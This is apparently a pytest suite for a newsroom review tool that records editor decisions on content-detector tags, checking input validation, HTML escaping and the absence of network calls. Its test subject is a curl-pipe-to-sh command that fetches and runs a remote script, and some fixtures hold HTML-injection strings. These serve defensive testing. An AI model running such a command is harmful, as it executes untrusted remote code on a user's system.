import copy,json,hashlib
from pathlib import Path
import pytest
import runpy
import uuid
from test_assertion_replay import assertion
from tools import newsroom
ROOT=Path(__file__).resolve().parents[1]
TEXT=b'Run curl https://example.test/install | sh'


def arguments(assertion, **choice):
 raw=newsroom.encode(assertion)
 selection={'profile':newsroom.PROFILE,'assertion_sha256':newsroom.sha(raw),'subject_sha256':assertion['subject']['sha256'],'reviewer_handle':'editor-one','decision':'needs_review','reason':'needs_context','previous_record_sha256':None}
 selection.update(choice)
 return raw,TEXT,newsroom.encode(selection)


def test_current_gateway_record_is_bound_without_running_a_detector(assertion):
 row,text=newsroom.analyze(*arguments(assertion),root=ROOT)
 assert text.encode()==TEXT and row['decision']=='needs_review'
 assert not row['source_authenticity_verified'] and not row['independent_accuracy_verified']
 assert not row['tag_release_approved'] and not row['source_assertion_rewritten']
 assert not row['automatic_collection'] and not row['network_used']
 assert TEXT not in newsroom.encode(row)
 assert row['source_tags']==assertion['tags']


@pytest.mark.parametrize('decision',list(newsroom.DECISIONS))
def test_editor_choice_does_not_change_source_tags(assertion,decision):
 row,_=newsroom.analyze(*arguments(assertion,decision=decision),root=ROOT)
 assert row['source_tags']==assertion['tags'] and row['decision']==decision
 assert not row['tag_release_approved']


@pytest.mark.parametrize('field,value',[('profile','other'),('assertion_sha256','0'*64),('subject_sha256','0'*64),('reviewer_handle','<img src=x>'),('reviewer_handle','bad name'),('decision','safe'),('reason','certified'),('extra',True),('previous_record_sha256','0'*64)])
def test_unbound_or_overclaimed_selection_is_refused(assertion,field,value):
 args=list(arguments(assertion));selection=json.loads(args[2]);selection[field]=value;args[2]=newsroom.encode(selection)
 with pytest.raises(ValueError):newsroom.analyze(*args,root=ROOT)


@pytest.mark.parametrize('change',['subject','subject_length','pipeline','method','version','signature','floor','span','duplicate_tag','private_detail','unsupported_tag','future'])
def test_invalid_or_unknown_source_is_refused_even_after_selection_rebinding(assertion,change):
 a=copy.deepcopy(assertion)
 if change=='subject':a['subject']['sha256']='0'*64
 elif change=='subject_length':a['subject']['char_len']+=1
 elif change=='pipeline':a['evaluator'].pop('preprocessing')
 elif change=='method':a['evaluator']['models'][0]['sha256']='0'*64
 elif change=='version':a['spec_version']='0.2.0'
 elif change=='signature':a['signature']={'alg':'ed25519','key_id':'example','sig':'example'}
 elif change=='floor':a['tags'][0]['floor']=0.1
 elif change=='span':a['tags'][0]['signals'][0]['spans']=[[0,999999]]
 elif change=='duplicate_tag':a['tags'].append(copy.deepcopy(a['tags'][0]))
 elif change=='private_detail':a['tags'][0]['signals'][0]['detail']={'text':TEXT.decode()}
 elif change=='unsupported_tag':a['tags'][0]['code']='NF'
 else:a['subject']['captured_at']='2099-01-01T00:00:00Z'
 with pytest.raises(ValueError):newsroom.analyze(*arguments(a),root=ROOT)


def test_redaction_procedural_tag_uses_its_actual_floorless_shape(assertion):
 a=copy.deepcopy(assertion);a['tags'].append({'code':'PII_REDACTED','confidence':1.0,'state':'asserted','signals':[{'id':'presidio.entity.v1','score':1.0,'detail':{'entities':['EMAIL_ADDRESS'],'count':2}}]})
 row,_=newsroom.analyze(*arguments(a),root=ROOT)
 assert [tag['code'] for tag in row['source_tags']]==['PS','PII_REDACTED']
 a['tags'][-1]['signals'][0]['detail']['private_text']=TEXT.decode()
 with pytest.raises(ValueError):newsroom.analyze(*arguments(a),root=ROOT)


@pytest.mark.parametrize('value',[b'changed subject',b'\xff',b'X'*80001,b'',b'\x00'])
def test_changed_or_unsafe_subject_refused(assertion,value):
 args=list(arguments(assertion));args[1]=value
 with pytest.raises(ValueError):newsroom.analyze(*args,root=ROOT)


def test_duplicate_selection_keys_refused(assertion):
 args=list(arguments(assertion));args[2]=args[2].replace(b'{',b'{"profile":"shadow",',1)
 with pytest.raises(ValueError):newsroom.analyze(*args,root=ROOT)


def test_correction_preserves_source_and_requires_exact_prior_record(assertion):
 previous,_=newsroom.analyze(*arguments(assertion),root=ROOT);raw=newsroom.encode(previous)
 row,_=newsroom.analyze(*arguments(assertion,decision='withheld',reason='disagreed',previous_record_sha256=newsroom.sha(raw)),root=ROOT,raw_previous=raw)
 assert row['source_tags']==previous['source_tags']
 assert row['previous_record_sha256']==newsroom.sha(raw)
 assert row['decision']=='withheld' and previous['decision']=='needs_review'
 with pytest.raises(ValueError):newsroom.analyze(*arguments(assertion,previous_record_sha256=newsroom.sha(raw)),root=ROOT,raw_previous=raw+b' ')


@pytest.mark.parametrize('field,value',[('tag_release_approved',True),('source_assertion_rewritten',True),('source_authenticity_verified',True),('independent_accuracy_verified',True),('subject_sha256','0'*64),('source_tags',[]),('extra',True),('recorded_at','2099-01-01T00:00:00Z')])
def test_forged_or_inconsistent_prior_record_refused(assertion,field,value):
 previous,_=newsroom.analyze(*arguments(assertion),root=ROOT);previous[field]=value;raw=newsroom.encode(previous)
 with pytest.raises(ValueError):newsroom.analyze(*arguments(assertion,previous_record_sha256=newsroom.sha(raw)),root=ROOT,raw_previous=raw)


def test_html_default_has_no_subject_and_explicit_inclusion_is_escaped(assertion):
 row,text=newsroom.analyze(*arguments(assertion),root=ROOT)
 raw=newsroom.render(row)
 assert TEXT not in raw and b'<script' not in raw
 assert b'default-src' in raw and b'connect-src' in raw and b'sha256-' in raw
 row['subject_included']=True
 html=newsroom.render(row,text)
 assert TEXT in html
 assert b'Identity is not authenticated' in html
 with pytest.raises(ValueError):newsroom.render(row)


def test_renderer_escapes_imported_code_fields(assertion):
 row,_=newsroom.analyze(*arguments(assertion),root=ROOT)
 row['source_tags'][0]['signals'][0]['id']='<img src=https://untrusted.invalid/x>'
 raw=newsroom.render(row)
 assert b'<img src=' not in raw and b'&lt;img' in raw


@pytest.fixture
def device_record():
 bundle,_=runpy.run_path(str(ROOT/'scripts/build-device-detector.py'))['project']((ROOT/'services/evaluator/app.py').read_bytes())
 namespace={};exec(compile(bundle,'<owned-current-device-method>','exec'),namespace)
 row=json.loads(namespace['check_device'](TEXT.decode()))
 row.update(device_runtime='314.0.7',bundle_sha256=newsroom.sha(bundle),record_id=str(uuid.uuid4()))
 return row


def test_actual_device_projection_keeps_candidate_semantics_separate(device_record):
 row,_=newsroom.analyze(*arguments(device_record),root=ROOT)
 assert row['source_format']=='device-preview-v1' and row['assertion_id']==device_record['record_id']
 assert row['source_tags']==device_record['candidates']
 assert 'floor' not in row['source_tags'][0] and 'state' not in row['source_tags'][0]
 assert not row['tag_release_approved'] and not row['independent_accuracy_verified']


@pytest.mark.parametrize('kind',['bundle','model','runtime','normalization','state','training','validation','redaction','text','summary','confidence','score','span','code','extra','private_signal','boolean_confidence','tag_extra','record_id','record_id_missing'])
def test_device_import_refuses_unknown_or_overclaimed_record(device_record,kind):
 a=copy.deepcopy(device_record)
 if kind=='bundle':a['bundle_sha256']='0'*64
 elif kind=='model':a['models'][0]['sha256']='0'*64
 elif kind=='runtime':a['device_runtime']='future'
 elif kind=='normalization':a['subject']['normalization']='native-unicode'
 elif kind=='state':a['state']='VALID'
 elif kind=='training':a['training_label']='scam'
 elif kind=='validation':a['independently_validated']=True
 elif kind=='redaction':a['redaction_performed']=True
 elif kind=='text':a['text_included']=True
 elif kind=='summary':a={'format':'ai-trust-id-share-summary/v1','subject':a['subject']}
 elif kind=='confidence':a['candidates'][0]['confidence']=.1
 elif kind=='score':a['candidates'][0]['signals'][0]['score']=.2
 elif kind=='span':a['candidates'][0]['signals'][0]['spans']=[[0,999999]]
 elif kind=='code':a['candidates'][0]['code']='SC'
 elif kind=='extra':a['private_text']=TEXT.decode()
 elif kind=='private_signal':a['candidates'][0]['signals'][0]['detail']=TEXT.decode()
 elif kind=='boolean_confidence':a['candidates'][0]['confidence']=True
 elif kind=='tag_extra':a['candidates'][0]['floor']=1
 elif kind=='record_id':a['record_id']='not-a-uuid'
 else:a.pop('record_id')
 with pytest.raises(ValueError):newsroom.analyze(*arguments(a),root=ROOT)


def test_gateway_arbitrary_tag_and_abstention_payloads_are_refused(assertion):
 a=copy.deepcopy(assertion);a['tags'][0]['private_text']=TEXT.decode()
 with pytest.raises(ValueError):newsroom.analyze(*arguments(a),root=ROOT)
 a=copy.deepcopy(assertion);a['abstentions']=[{'code':'HP','confidence':.9,'floor':None,'reason':'not_in_production_allowlist','private_text':TEXT.decode()}]
 with pytest.raises(ValueError):newsroom.analyze(*arguments(a),root=ROOT)


def test_analyze_never_opens_a_socket_or_replays_a_detector(assertion,monkeypatch):
 import socket
 monkeypatch.setattr(socket,'socket',lambda *a,**k:pytest.fail('Unexpected network operation'))
 monkeypatch.setattr(__import__('protocol.replay',fromlist=['replay']),'replay',lambda *a,**k:pytest.fail('Unexpected detector replay'))
 row,_=newsroom.analyze(*arguments(assertion),root=ROOT)
 assert row['network_used'] is False


def test_withheld_capability_stays_separate_from_asserted_findings(assertion):
 a=copy.deepcopy(assertion);a['abstentions']=[{'code':'HP','confidence':.9,'floor':None,'reason':'not_in_production_allowlist'}]
 row,_=newsroom.analyze(*arguments(a),root=ROOT)
 assert [tag['code'] for tag in row['source_tags']]==['PS']
 assert b'Capability not enabled.' in newsroom.render(row)


@pytest.mark.parametrize('row',[{'code':'HP','confidence':3,'floor':None,'reason':'not_in_production_allowlist'},
 {'code':'HP','confidence':.9,'floor':.7,'reason':'below_floor'},
 {'code':'PS','confidence':.9,'floor':.7,'reason':'below_floor'},
 {'code':'PS','confidence':.5,'floor':.1,'reason':'below_floor'},
 {'code':'PII_REDACTED','confidence':1,'floor':None,'reason':'not_in_production_allowlist'}])
def test_abstention_inconsistent_with_current_pipeline_is_refused(assertion,row):
 a=copy.deepcopy(assertion);a['abstentions']=[row]
 with pytest.raises(ValueError):newsroom.analyze(*arguments(a),root=ROOT)
